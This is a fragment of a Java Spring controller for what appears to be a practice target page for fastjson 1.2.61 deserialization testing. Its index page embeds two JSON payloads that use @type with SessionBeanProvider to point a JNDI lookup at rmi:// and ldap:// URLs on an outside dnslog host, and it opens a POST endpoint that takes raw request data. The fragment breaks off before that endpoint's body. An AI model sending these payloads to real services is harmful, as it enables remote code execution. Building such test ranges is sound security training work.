...
public class FastjsonController {
    ...
    @GetMapping(value = {"/", "/fastjson-1.2.61"}, produces = "text/html;charset=UTF-8")
    @ResponseBody
    public String index() {
        return buildPage("fastjson-1.2.61 靶场测试页", "/fastjson1.2.61-process", new String[]{
                "{\"@type\":\"org.apache.commons.proxy.provider.remoting.SessionBeanProvider\",\"jndiName\":\"rmi://fastjson1.2.61-process.dnslog.cn/Exploit\"}",
                "{\"@type\":\"org.apache.commons.proxy.provider.remoting.SessionBeanProvider\",\"jndiName\":\"ldap://fastjson1.2.61-process.dnslog.cn/Exploit\",\"Object\":\"a\"}"
        }, "{\"name\":\"123\",\"email\":\"123@123\",\"age\":\"123\"}");
    }

    @PostMapping("/fastjson1.2.61-process")
    public String fastjson1_2_61_process(@RequestBody String data) {
